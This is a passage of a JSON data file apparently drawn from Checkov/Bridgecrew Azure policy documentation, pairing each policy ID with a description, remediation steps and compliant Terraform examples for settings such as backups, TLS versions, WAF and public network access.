secret_permissions = [\"get\"]\n}\n\nresource \"azurerm_key_vault_key\" \"ok\" {\n  name         = \"tfex-key\"\n  key_vault_id = azurerm_key_vault.ok.id\n  key_type     = \"RSA\"\n  key_size     = 2048\n  key_opts     = [\"decrypt\", \"encrypt\", \"sign\", \"unwrapKey\", \"verify\", \"wrapKey\"]\n  depends_on = [\n    azurerm_key_vault_access_policy.client,\n    azurerm_key_vault_access_policy.server,\n  ]\n}\n\nresource \"azurerm_mysql_server\" \"ok\" {\n  name                             = \"ok-mysql-server\"\n  location                         = azurerm_resource_group.ok.location\n  resource_group_name              = azurerm_resource_group.ok.name\n  sku_name                         = \"GP_Gen5_2\"\n  administrator_login              = \"acctestun\"\n  administrator_login_password     = \"[email\u00a0protected]!\"\n  ssl_enforcement_enabled          = true\n  ssl_minimal_tls_version_enforced = \"TLS1_1\"\n  storage_mb                       = 51200\n  version                          = \"5.6\"\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n}\n\nresource \"azurerm_mysql_server_key\" \"ok\" {\n  server_id        = azurerm_mysql_server.ok.id\n  key_vault_key_id = azurerm_key_vault_key.ok.id\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_149": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-virtual-machine-does-not-enable-password-authentication",
        "description": "Azure Virtual machine enables password authentication\nDescription\nDisabling password authentication for your Azure virtual machine (VM) can help improve the security of your VM. Password authentication allows users to access the VM using a password, rather than an Azure Active Directory (Azure AD) account or other form of authentication.\nBy disabling password authentication, you can help prevent unauthorized access to your VM and protect it from potential security threats such as data breaches or unauthorized access. Instead, you should use more secure forms of authentication such as Azure AD, SSH keys, or multi-factor authentication.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_linux_virtual_machine_scale_set\nArgument: disable_password_authenticatio\n\nGoresource \"azurerm_linux_virtual_machine_scale_set\" \"pass\" {\n  name                            = var.scaleset_name\n  resource_group_name             = var.resource_group.name\n  location                        = var.resource_group.location\n  sku                             = var.sku\n  instances                       = var.instance_count\n  admin_username                  = var.admin_username\n  disable_password_authentication = true\n  tags                            = { test = \"Fail\" }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_136": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-postgresql-flexible-server-enables-geo-redundant-backups",
        "description": "Azure PostgreSQL Flexible Server does not enable geo-redundant backups\nDescription\nAzure PostgreSQL Flexible Server allows you to choose between locally redundant or geo-redundant backup storage in the General Purpose and Memory Optimized tiers. When the backups are stored in geo-redundant backup storage, they are not only stored within the region in which your server is hosted, but are also replicated to a paired data center. This provides better protection and ability to restore your server in a different region in the event of a disaster.\nFix - Runtime\nTBA\nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_flexible_server\nArgument: geo_redundant_backup_enabled\n\nGoresource \"azurerm_postgresql_flexible_server\" \"pass\" {\n  name                   = \"example-psqlflexibleserver\"\n  resource_group_name    = \"azurerm_resource_group.example.name\"\n  location               = \"azurerm_resource_group.example.location\"\n  version                = \"12\"\n  delegated_subnet_id    = \"azurerm_subnet.example.id\"\n  private_dns_zone_id    = \"azurerm_private_dns_zone.example.id\"\n  administrator_login    = \"psqladmin\"\n  administrator_password = \"[email\u00a0protected]!\"\n  zone                   = \"1\"\n\n  storage_mb                   = 32768\n  geo_redundant_backup_enabled = true\n\n  sku_name   = \"GP_Standard_D4s_v3\"\n  depends_on = [\"azurerm_private_dns_zone_virtual_network_link.example\"]\n\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_13": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-sql-servers-enables-data-security-policy",
        "description": "SQL servers do not enable data security policy\nDescription\nAzure Defender for SQL provides a new layer of security, which enables customers to detect and respond to potential threats as they occur by providing security alerts on anomalous activities. Users will receive an alert upon suspicious database activities, potential vulnerabilities, SQL injection attacks, as well as anomalous database access patterns. Advanced threat protection alerts provide details of suspicious activity and recommend action on how to investigate and mitigate the threat.\nFix - Runtime\nIn Azure CLI\n\nLog in to the Azure Portal.\nGo to the reported SQL server\nSelect 'SQL servers', Click on the SQL server instance you wanted to modify\nClick on 'Security Center' under 'Security'\nClick on 'Enable Azure Defender for SQL'\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_sql_server, azurerm_mssql_server_security_alert_policy\nArgument: server_name (of azurerm_mssql_server_security_alert_policy )\n\nGoresource \"azurerm_sql_server\" \"sql_server_good_1\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = \"group\"\n  location                     = \"location\"\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}\n\nresource \"azurerm_sql_server\" \"sql_server_good_2\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = \"group\"\n  location                     = \"location\"\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}\n\n\nresource \"azurerm_mssql_server_security_alert_policy\" \"alert_policy_good\" {\n  resource_group_name        = \"group\"\n  server_name                = azurerm_sql_server.sql_server_good_1.name\n  state                      = \"Enabled\"\n  retention_days = 20\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AZURE_22": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-cognitive-services-enables-customer-managed-keys-cmks-for-encryption",
        "description": "Azure Cognitive Services does not Customer Managed Keys (CMKs) for encryption\nDescription\nThis policy identifies Cognitive Services which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your Cognitive Services data. It gives you full control over the encrypted data.\nRuntime - Buildtime \nFix - Buildtime \nTerraform\n\nResource:  azurerm_cognitive_account_customer_managed_key\nArgument: cognitive_account_id + key_vault_key_id\n\nGoresource \"azurerm_cognitive_account\" \"cognitive_account_good\" {\n  name                  = \"example-account\"\n  location              = azurerm_resource_group.example.location\n  resource_group_name   = azurerm_resource_group.example.name\n  kind                  = \"Face\"\n  sku_name              = \"E0\"\n  public_network_access_enabled = false\n}\n\nresource \"azurerm_key_vault\" \"good_vault\" {\n  name                     = \"example-vault\"\n  location                 = azurerm_resource_group.example.location\n  resource_group_name      = azurerm_resource_group.example.name\n  tenant_id                = data.azurerm_client_config.current.tenant_id\n  sku_name                 = \"standard\"\n}\n\nresource \"azurerm_key_vault_key\" \"good_key\" {\n  name         = \"example-key\"\n  key_vault_id = azurerm_key_vault.good_vault.id\n  key_type     = \"RSA\"\n  key_size     = 2048\n  key_opts     = [\"decrypt\", \"encrypt\", \"sign\", \"unwrapKey\", \"verify\", \"wrapKey\"]\n}\n\nresource \"azurerm_cognitive_account_customer_managed_key\" \"good_cmk\" {\n  cognitive_account_id = azurerm_cognitive_account.cognitive_account_good.id\n  key_vault_key_id     = azurerm_key_vault_key.good_key.id\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_144": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-workspace-is-not-publicly-accessible",
        "description": "Azure Machine Learning Workspace is publicly accessible\nDescription\nDisabling the public network access property improves security by ensuring your Azure Machine Learning Workspaces can only be accessed from a private endpoint. This configuration strictly disables access from any public address space outside of Azure IP range and denies all logins that match IP or virtual network-based firewall rules.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_machine_learning_workspace\nArgument: public_network_access_enabled\n\nGoresource \"azurerm_machine_learning_workspace\" \"ckv_unittest_pass\" {\n  name                          = \"example-workspace\"\n  location                      = azurerm_resource_group.example.location\n  resource_group_name           = azurerm_resource_group.example.name\n  application_insights_id       = azurerm_application_insights.example.id\n  key_vault_id                  = azurerm_key_vault.example.id\n  storage_account_id            = azurerm_storage_account.example.id\n  public_network_access_enabled = false\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n\n  encryption {\n    key_vault_id = azurerm_key_vault.example.id\n    key_id       = azurerm_key_vault_key.example.id\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_12": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-virtual-machines-are-backed-up-using-azure-backup",
        "description": "Virtual Machines are not backed up using Azure backup\nDescription\nEnsure that Azure Backup service is enabled and configured to create server backups for your Microsoft Azure virtual machines (VMs), in order to follow data security best practices and compliance requirements. Azure Backup service is a cost-effective, one-click backup solution, that simplifies virtual machine data recovery in your Azure cloud account.\nOnce Azure Backup service is configured, your virtual machines are backed up according to a precise schedule defined within the appropriate backup policy, then recovery points are created from those backups and stored in the Azure Recovery Services vaults.\nFix - Runtime\nIn Azure Console\n\nSign in to Azure Management Console.\nNavigate to All resources blade at https://portal.azure.com/#blade/HubsExtension/BrowseAll to access all your Microsoft Azure resources.\nChoose the Azure subscription that you want to access from the Subscription filter box.\nFrom the Type filter box, select Virtual machine to list only the Azure virtual machines available in the selected subscription.\nClick on the name of the virtual machine (VM) that you want to reconfigure.\nOn the navigation panel, under Operations, select Backup to access the Azure Backup service configuration for the selected virtual machine.\nOn the Backup page, perform the following:\na. From the Recovery Service vault choose whether to create a new vault or select an existing one. An Azure Recovery Service vault is a storage entity that holds the virtual machine backups.\nb.From Choose backup policy dropdown list select an existing backup policy or click Create (or edit) a new policy to create/edit a new backup policy. A backup policy specifies frequency and time at which specified resources will be backed up and how long the backup copies are retained.\nc. Once the backup policy is properly configured, click Enable Backup to enable server backups for the selected Microsoft Azure virtual machine. You can now start a backup job by using Backup now button or wait for the selected policy to run the job at the scheduled time. The first backup job creates a full recovery point. Each backup job after the initial server backup creates incremental recovery points.\nRepeat steps no. 5 \u2013 7 to enable server backups for other Azure virtual machines available in the selected subscription.\nRepeat steps no. 4 \u2013 8 for each subscription created in your Microsoft Azure cloud account.\n\nIn Azure CLI\n\nRun backup vault create command (Windows/macOS/Linux) to create a new Azure Recovery Service vault that will hold all the server backups created for the specified Azure virtual machine (VM):\n\nTextaz backup vault create\n    --resource-group cloud-shell-storage-westeurope\n    --name cc-new-backup-vault\n    --location westeurope\n\n\nThe command output should return the configuration metadata for the new vault:\n\nText{\n  \"eTag\": null,\n  \"id\": \"/subscriptions/abcdabcd-1234-abcd-1234-abcdabcdabcd/resourceGroups/cloud-shell-storage-westeurope/providers/Microsoft.RecoveryServices/vaults/cc-new-backup-vault\",\n  \"location\": \"westeurope\",\n  \"name\": \"cc-new-backup-vault\",\n  \"properties\": {\n    \"provisioningState\": \"Succeeded\",\n    \"upgradeDetails\": null\n  },\n  \"resourceGroup\": \"cloud-shell-storage-westeurope\",\n  \"sku\": {\n    \"name\": \"Standard\"\n  },\n  \"tags\": null,\n  \"type\": \"Microsoft.RecoveryServices/vaults\"\n}\n\n\nRun backup protection enable-for-vm command (Windows/macOS/Linux) to enable server backups for the selected Microsoft Azure virtual machine. Use the default backup policy provided by Azure Backup service or run az backup policy set command (Windows/macOS/Linux) to update the default policy if you need to change the backup schedule/frequency and/or the retention period configured. The default backup protection policy (i.e. \"DefaultPolicy\") runs a backup job each day and retains recovery points for 30 days:\n\nTextaz backup protection enable-for-vm\n    --resource-group cloud-shell-storage-westeurope\n    --vm cc-production-vm\n    --vault-name cc-new-backup-vault\n    --policy-name DefaultPolicy\n\n\nThe command output should return the backup protection enable-for-vm command request metadata:\n\nText{\n  \"eTag\": null,\n  \"id\": \"/subscriptions/abcdabcd-1234-abcd-1234-abcdabcdabcd/resourcegroups/cc-vm-resource-group/providers/microsoft.recoveryservices/vaults/cc-new-backup-vault/backupJobs/abcdabcd-1234-abcd-1234-abcdabcdabcd\",\n  \"location\": null,\n  \"name\": \"abcdabcd-1234-abcd-1234-abcdabcdabcd\",\n  \"properties\": {\n    \"actionsInfo\": null,\n    \"activityId\": \"abcdabcd-1234-abcd-1234-abcdabcdabcd\",\n    \"backupManagementType\": \"AzureIaasVM\",\n    \"containerName\": \";iaasvmcontainerv2;cc-vm-resource-group;cc-production-vm\",\n    \"duration\": \"0:00:30.975155\",\n    \"endTime\": \"2019-10-29T12:15:00.240606+00:00\",\n    \"entityFriendlyName\": \"cc-production-vm\",\n    \"errorDetails\": null,\n    \"extendedInfo\": {\n      \"dynamicErrorMessage\": null,\n      \"estimatedRemainingDuration\": null,\n      \"internalPropertyBag\": null,\n      \"progressPercentage\": null,\n      \"propertyBag\": {\n        \"Policy Name\": \"DefaultPolicy\",\n        \"VM Name\": \"cc-production-vm\"\n      },\n      \"tasksList\": []\n    },\n    \"jobType\": \"AzureIaaSVMJob\",\n    \"operation\": \"ConfigureBackup\",\n    \"startTime\": \"2019-10-29T12:15:00.265451+00:00\",\n    \"status\": \"Completed\",\n    \"virtualMachineVersion\": \"Compute\"\n  },\n  \"resourceGroup\": \"cloud-shell-storage-westeurope\",\n  \"tags\": null,\n  \"type\": \"Microsoft.RecoveryServices/vaults/backupJobs\"\n}\n\n\nRepeat steps no. 1 \u2013 4 to enable server backups for other Azure virtual machines provisioned in the current subscription.\nRepeat steps no. 1 \u2013 5 for each subscription available within your Microsoft Azure cloud account.\n\nFix - Buildtime \nTerraform\n\nResource: azurerm_backup_protected_vm, azurerm_virtual_machine\n\nGoresource \"azurerm_virtual_machine\" \"example_ok\" {\n  name                  = \"${var.prefix}-vm\"\n  location              = azurerm_resource_group.main.location\n  resource_group_name   = azurerm_resource_group.main.name\n  network_interface_ids = [azurerm_network_interface.main.id]\n  vm_size               = \"Standard_DS1_v2\"\n}\n\nresource \"azurerm_backup_protected_vm\" \"vm_protected_backup\" {\n  resource_group_name = azurerm_resource_group.example_ok.name\n  recovery_vault_name = azurerm_recovery_services_vault.example_ok.name\n  source_vm_id        = azurerm_virtual_machine.example_ok.id\n  backup_policy_id    = azurerm_backup_policy_vm.example_ok.id\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_142": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-compute-cluster-local-authentication-is-disabled",
        "description": "Azure Machine Learning Compute Cluster Local Authentication is enabled\nDescription\nDisabling local authentication for Azure Machine Learning Compute Clusters can help improve the security of your clusters. Local authentication allows users to access the cluster using a local account and password, rather than an Azure Active Directory (Azure AD) account.\nFix - Runtime\nCLI Command\nFix - Buildtime \nTerraform\n\nResource: azurerm_machine_learning_compute_cluster\nArgument: local_auth_enabled \n\nGoresource \"azurerm_machine_learning_compute_cluster\" \"ckv_unittest_pass\" {\n  name                          = \"example\"\n  location                      = \"West Europe\"\n  vm_priority                   = \"LowPriority\"\n  vm_size                       = \"Standard_DS2_v2\"\n  machine_learning_workspace_id = azurerm_machine_learning_workspace.example.id\n  local_auth_enabled            = false\n\n  scale_settings {\n    min_node_count                       = 0\n    max_node_count                       = 1\n    scale_down_nodes_after_idle_duration = \"PT30S\" # 30 seconds\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_152": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-client-certificates-are-enforced-for-api-management",
        "description": "Azure Client Certificates are not enforced for API management\nDescription\nBy enforcing client certificates for API management, you can ensure that only clients that have a valid certificate are able to access your APIs. This can help prevent unauthorized access to your APIs, and can also help protect against potential security threats such as data breaches or denial of service attacks.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_app_service\nArgument: client_cert_enabled\n\nGoresource \"azurerm_app_service\" \"pass\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  client_cert_enabled = true\n  }\n",
        "severity": "LOW"
    },
    "CKV_AZURE_143": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-aks-cluster-nodes-do-not-have-public-ip-addresses",
        "description": "Azure AKS cluster nodes have public IP addresses\nDescription\nDisabling the public network access properly improves security by ensuring your Azure AKS cluster nodes can only be accessed from a non-public IP address. \nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_kubernetes_cluster\nArgument: enable_node_public_ip (default is \"false\")\n\nGoresource \"azurerm_kubernetes_cluster\" \"ckv_unittest_pass\" {\n  name                = \"example-aks1\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  dns_prefix          = \"exampleaks1\"\n\n  default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n\n  tags = {\n    Environment = \"Production\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_151": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-windows-vm-enables-encryption",
        "description": "Azure Windows VM does not enable encryption\nDescription\nEnabling encryption for your Azure Windows virtual machine (VM) can help improve the security of your VM and its data. Encryption helps protect data by encoding it in such a way that it can only be accessed by authorized users.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_windows_virtual_machine\nArgument: encryption_at_host_enabled\n\nGoresource \"azurerm_windows_virtual_machine\" \"pass\" {\n  name                = \"example-machine\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  size                = \"Standard_F2\"\n  admin_username      = \"adminuser\"\n  admin_password      = \"[email\u00a0protected]$$w0rd1234!\"\n\n  network_interface_ids = [\n    azurerm_network_interface.example.id,\n  ]\n\n  os_disk {\n    caching              = \"ReadWrite\"\n    storage_account_type = \"Standard_LRS\"\n  }\n\n  source_image_reference {\n    publisher = \"MicrosoftWindowsServer\"\n    offer     = \"WindowsServer\"\n    sku       = \"2016-Datacenter\"\n    version   = \"latest\"\n  }\n\n   encryption_at_host_enabled=true\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_138": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-acr-disables-anonymous-image-pulling",
        "description": "Azure ACR enables anonymous image pulling\nDescription\nDisabling anonymous image pulling for your Azure Container Registry (ACR) can help improve the security of your registry. When anonymous image pulling is enabled, anyone can pull images from your registry without needing to authenticate or have authorization.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_container_registry\nArgument: anonymous_pull_enabled\n\nGoresource \"azurerm_container_registry\" \"ckv_unittest_pass_1\" {\n  name                   = \"containerRegistry1\"\n  resource_group_name    = azurerm_resource_group.rg.name\n  location               = azurerm_resource_group.rg.location\n  sku                    = \"Premium\"\n  anonymous_pull_enabled = false\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_160": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-http-port-80-access-from-the-internet-is-restricted",
        "description": "Azure HTTP (port 80) access from the internet is not restricted\nDescription\nRestricting access to Azure HTTP (port 80) from the internet can help improve the security of your resources. Port 80 is used for HTTP traffic, and allowing access to it from the internet can expose your resources to potential security threats, such as malware, data breaches, and unauthorized access.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_network_security_rule\nArgument: destination_port_range\n\nGoresource \"azurerm_network_security_rule\" \"https\" {\n  name                        = \"example\"\n  access                      = \"Allow\"\n  direction                   = \"Inbound\"\n  network_security_group_name = \"azurerm_network_security_group.example.name\"\n  priority                    = 100\n  protocol                    = \"Tcp\"\n  resource_group_name         = \"azurerm_resource_group.example.name\"\n\n  destination_port_range = 443\n  source_address_prefix  = \"Internet\"\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-va-setting-periodic-recurring-scans-is-enabled-on-a-sql-server",
        "description": "Azure SQL server ADS Vulnerability Assessment Periodic recurring scans is disabled\nDescription\nEnable Vulnerability Assessment (VA) Periodic recurring scans for critical SQL servers and corresponding SQL databases.\nVA setting 'Periodic recurring scans' schedules periodic (weekly) vulnerability scanning for the SQL server and corresponding Databases. Periodic and regular vulnerability scanning provides risk visibility based on updated known vulnerability signatures and best practices.\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_sql_server,  azurerm_storage_account, azurerm_storage_container,  azurerm_mssql_server_security_alert_policy, azurerm_mssql_server_vulnerability_assessment\n\nGoresource \"azurerm_resource_group\" \"okExample\" {\n  name     = \"okExample-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_sql_server\" \"okExample\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = azurerm_resource_group.okExample.name\n  location                     = azurerm_resource_group.okExample.location\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}\n\nresource \"azurerm_storage_account\" \"okExample\" {\n  name                     = \"accteststorageaccount\"\n  resource_group_name      = azurerm_resource_group.okExample.name\n  location                 = azurerm_resource_group.okExample.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n}\n\nresource \"azurerm_storage_container\" \"okExample\" {\n  name                  = \"accteststoragecontainer\"\n  storage_account_name  = azurerm_storage_account.okExample.name\n  container_access_type = \"private\"\n}\n\nresource \"azurerm_mssql_server_security_alert_policy\" \"okExample\" {\n  resource_group_name = azurerm_resource_group.okExample.name\n  server_name         = azurerm_sql_server.okExample.name\n  state               = \"Enabled\"\n}\n\nresource \"azurerm_mssql_server_vulnerability_assessment\" \"okExample\" {\n  server_security_alert_policy_id = azurerm_mssql_server_security_alert_policy.okExample.id\n  storage_container_path          = \"${azurerm_storage_account.okExample.primary_blob_endpoint}${azurerm_storage_container.okExample.name}/\"\n  storage_account_access_key      = azurerm_storage_account.okExample.primary_access_key\n\n  recurring_scans {\n    enabled                   = true\n    email_subscription_admins = true\n    emails = [\n      \"[email\u00a0protected]\",\n      \"[email\u00a0protected]\"\n    ]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_15": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-azure-data-factories-are-encrypted-with-a-customer-managed-key",
        "description": "Azure data factories are not encrypted with a customer-managed key\nDescription\nUse customer-managed keys to manage the encryption at rest of your Azure Data Factory. By default, customer data is encrypted with service-managed keys, but customer-managed keys are commonly required to meet regulatory compliance standards. Customer-managed keys enable the data to be encrypted with an Azure Key Vault key created and owned by you. You have full control and responsibility for the key lifecycle, including rotation and management.\nFix - Buildtime \nTerraform\n\nResource: azurerm_data_factory, azurerm_data_factory_linked_service_key_vault\nArgument: data_factory_name (of azurerm_data_factory_linked_service_key_vault )\n\nGoresource \"azurerm_data_factory\" \"data_factory_good\" {\n  name                = \"example\"\n  location            = \"location\"\n  resource_group_name = \"group\"\n}\n\nresource \"azurerm_data_factory_linked_service_key_vault\" \"factory_good\" {\n  name                = \"example\"\n  resource_group_name = \"example\"\n  data_factory_name   = azurerm_data_factory.data_factory_good.name\n  key_vault_id        = \"123456\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_156": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-postgresql-database-server-has-log-retention-enabled",
        "description": "Azure PostgreSQL Database Server does not have log retention enabled\nDescription\nEnabling log retention for your Azure PostgreSQL Database Server can help improve the security and management of your database. Log retention allows you to keep a record of events and activities that have occurred on your database, such as user logins, data changes, and other actions.\nRuntime - Buildtime \nFix - Buildtime \nTerraform\n\nResource: azurerm_postgresql_configuration\nArgument: name, value\n\nGoresource \"azurerm_postgresql_configuration\" \"pass\" {\n  name                = \"log_retention\"\n  resource_group_name = data.azurerm_resource_group.example.name\n  server_name         = azurerm_postgresql_server.example.name\n  value               = \"on\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_120": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-application-gateway-enables-waf",
        "description": "Azure application gateway does not have WAF enabled\nDescription\nWAF is a security feature that provides protection for web applications by inspecting incoming traffic and blocking malicious requests before they reach the application. When WAF is enabled on an Azure application gateway, it analyzes incoming traffic to the gateway and blocks requests that are determined to be malicious based on a set of rules. This can help to protect your application from a variety of threats, such as SQL injection attacks, cross-site scripting (XSS) attacks, and other types of attacks.\nFix - Buildtime \nTerraform\n\nResource: azurerm_application_gateway\nArgument: waf_configuration.enabled\n\nGoresource \"azurerm_application_gateway\" \"network\" {\n              ...\n+             waf_configuration {\n+               enabled = true\n              }\n            }\n",
        "severity": "LOW"
    },
    "CKV2_AZURE_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-vulnerability-assessment-va-is-enabled-on-a-sql-server-by-setting-a-storage-account",
        "description": "Azure SQL server ADS Vulnerability Assessment is disabled \nDescription\nEnable Vulnerability Assessment (VA) service scans for critical SQL servers and corresponding SQL databases.\nEnabling Azure Defender for SQL server does not enables Vulnerability Assessment capability for individual SQL databases unless storage account is set to store the scanning data and reports.\nThe Vulnerability Assessment service scans databases for known security vulnerabilities and highlight deviations from best practices, such as misconfigurations, excessive permissions, and unprotected sensitive data. Results of the scan include actionable steps to resolve each issue and provide customized remediation scripts where applicable. Additionally an assessment report can be customized by setting an acceptable baseline for permission configurations, feature configurations, and database settings.\nWe recommend you ensure Vulnerability Assessment is enabled on a SQL server by setting a Storage Account.\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_sql_server, azurerm_storage_account, azurerm_storage_container, azurerm_mssql_server_security_alert_policy, azurerm_mssql_server_vulnerability_assessment\n\nGoresource \"azurerm_resource_group\" \"okExample\" {\n  name     = \"okExample-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_sql_server\" \"okExample\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = azurerm_resource_group.okExample.name\n  location                     = azurerm_resource_group.okExample.location\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  administrator_login_password = \"4-v3ry-53cr37-p455w0rd\"\n}\n\nresource \"azurerm_storage_account\" \"okExample\" {\n  name                     = \"accteststorageaccount\"\n  resource_group_name      = azurerm_resource_group.okExample.name\n  location                 = azurerm_resource_group.okExample.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n}\n\nresource \"azurerm_storage_container\" \"okExample\" {\n  name                  = \"accteststoragecontainer\"\n  storage_account_name  = azurerm_storage_account.okExample.name\n  container_access_type = \"private\"\n}\n\nresource \"azurerm_mssql_server_security_alert_policy\" \"okExample\" {\n  resource_group_name = azurerm_resource_group.okExample.name\n  server_name         = azurerm_sql_server.okExample.name\n  state               = \"Enabled\"\n}\n\nresource \"azurerm_mssql_server_vulnerability_assessment\" \"okExample\" {\n  server_security_alert_policy_id = azurerm_mssql_server_security_alert_policy.okExample.id\n  storage_container_path          = \"${azurerm_storage_account.okExample.primary_blob_endpoint}${azurerm_storage_container.okExample.name}/\"\n  storage_account_access_key      = azurerm_storage_account.okExample.primary_access_key\n\n  recurring_scans {\n    enabled                   = true\n    email_subscription_admins = true\n    emails = [\n      \"[email\u00a0protected]\",\n      \"[email\u00a0protected]\"\n    ]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_150": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-compute-cluster-minimum-nodes-is-set-to-0",
        "description": "Azure Machine Learning Compute Cluster Minimum Nodes is not set to 0\nDescription\nSetting the minimum number of nodes for your Azure Machine Learning Compute Clusters to 0 can help reduce the cost of running the cluster when it is not in use. When the minimum number of nodes is set to 0, the cluster is scaled down to 0 nodes when it is not in use, and no resources are consumed.\nBy setting the minimum number of nodes to 0, you can ensure that the cluster is not consuming resources when it is not in use, which can help reduce your costs. This can be especially useful if you only need to use the cluster occasionally or on an as-needed basis.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_machine_learning_compute_cluster\nArgument: scale_settings.min_node_count\n\nGoresource \"azurerm_machine_learning_compute_cluster\" \"ckv_unittest_pass\" {\n    name                          = \"example\"\n    location                      = \"West Europe\"\n    vm_priority                   = \"LowPriority\"\n    vm_size                       = \"Standard_DS2_v2\"\n    machine_learning_workspace_id = azurerm_machine_learning_workspace.example.id\n    subnet_resource_id            = azurerm_subnet.example.id\n\n    scale_settings {\n        min_node_count                       = 0\n        max_node_count                       = 1\n        scale_down_nodes_after_idle_duration = \"PT30S\" # 30 seconds\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_148": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-redis-cache-uses-the-latest-version-of-tls-encryption",
        "description": "Azure Redis Cache does not use the latest version of TLS encryption\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your Azure Redis Cache instances.\nFix - Runtime\nFix - Buildtime \nTerraform\n\nResource: azurerm_redis_cache\nArgument: minimum_tls_version\n\nGoresource \"azurerm_redis_cache\" \"pass\" {\n  name                = \"timeout-redis\"\n  location            = \"West Europe\"\n  resource_group_name = azurerm_resource_group.example_rg.name\n  subnet_id           = azurerm_subnet.example_redis_snet.id\n\n  family      = \"P\"\n  capacity    = 1\n  sku_name    = \"Premium\"\n  shard_count = 1\n\n  enable_non_ssl_port           = false\n  minimum_tls_version           = \"1.2\"\n  public_network_access_enabled = true\n\n  redis_configuration {\n    enable_authentication = true\n    maxmemory_policy      = \"volatile-lru\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AZURE_162": {
        "url": "https://docs.bridgecrew.io/docs/ensure-azure-spring-cloud-api-portal-public-access-is-disabled",
